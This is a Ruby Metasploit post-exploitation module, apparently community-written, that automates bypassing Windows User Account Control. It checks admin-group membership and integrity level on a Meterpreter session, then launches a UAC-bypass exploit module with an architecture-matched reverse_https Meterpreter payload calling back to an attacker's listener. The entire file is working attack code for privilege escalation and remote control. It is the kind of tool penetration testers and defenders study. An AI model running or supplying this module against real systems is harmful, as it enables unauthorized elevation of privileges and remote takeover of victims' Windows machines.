##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class MetasploitModule < Msf::Post

  include Msf::Post::Windows::Priv

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Post Smart Bypass of UAC',
      'Description'   => %q{ This module will run the module exploit/windows/local/bypassuac_injection and select the
                             proper system type and payload.},
      'License'       => MSF_LICENSE,
      'Author'        => [ 'sn0wfa11'],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
      [
        OptString.new('LHOST',   [ true, 'The local listener hostname']),
        OptString.new('METHOD',   [ true, 'The bypass UAC exploit to use', 'exploit/windows/local/bypassuac_eventvwr']),
        OptString.new('64_PAYLOAD',   [ true, 'Payload to use on x64 machines', 'windows/x64/meterpreter/reverse_https']),
        OptPort.new('64_LPORT',   [ true, 'The local listener port for x64 payload']),
        OptString.new('86_PAYLOAD',   [ true, 'Payload to use on x86 machines', 'windows/meterpreter/reverse_https']),
        OptPort.new('86_LPORT',   [ true, 'The local listener port for x86 payload']),
        OptBool.new('DisablePayloadHandler',   [ true, 'Disable Payload Handler', true])
      ], self.class)
  end

  def run

    if !(check_permissions)
      return
    end

    if is_admin?
      print_error("Already Admin, no need to run this module. Exiting.")
      return
    end

    sysarch = sysinfo['Architecture']
    lhost = datastore['LHOST']

    exploit_mod = datastore['METHOD']
 
    if exploit_mod =~ /^exploit\//
      exploit_mod.gsub!(/^exploit\//,"")
    end

    bypassuac = framework.modules.create(exploit_mod) #create the necessary MSF module

    if bypassuac.nil?
      print_error("Exploit module could not be initialized!")
    end

    # set the correct payload for the target system
    if sysarch =~ /x64/i
      target = 1
      payload = datastore['64_PAYLOAD']
      lport = datastore['64_LPORT']
      arch = "x64"
    else
      target = 0
      payload = datastore['86_PAYLOAD']
      lport = datastore['86_LPORT']
      arch = "x86"
    end

    print_status("Running #{exploit_mod} against session: #{datastore['SESSION']}")
    print_status("Machine is #{arch}, using payload #{payload} to #{lhost}:#{lport}")

    bypassuac.datastore['LHOST'] = lhost
    bypassuac.datastore['LPORT'] = lport
    bypassuac.datastore['DisablePayloadHandler'] = true
    bypassuac.datastore['SESSION'] = datastore['SESSION']
    bypassuac.exploit_simple(
      'LocalInput'     => self.user_input,
      'LocalOutput'    => self.user_output,
      'Target'         => target,
      'Payload'        => payload,
      'RunAsJob'       => true)
  end

  # This function will return the current user's permissions information
  #
  # @return [true class] The user has admin rights
  # @return [false class] The user does not have admin rights

  def check_permissions
    # Check if you are an admin
    print_status("Checking admin status...")
    admin_group = is_in_admin_group?

    if admin_group.nil?
      print_error("Either whoami is not there or failed to execute")
      print_error("Continuing under assumption you already checked...")
    else
      if admin_group
        print_good("Part of Administrators group! Continuing...")
      else
        print_error("Not in admins group, cannot escalate with this module")
        return false
      end
    end

    if get_integrity_level == INTEGRITY_LEVEL_SID[:low]
      print_error("Cannot BypassUAC from Low Integrity Level")
      return false
    end
    return true
  end

end
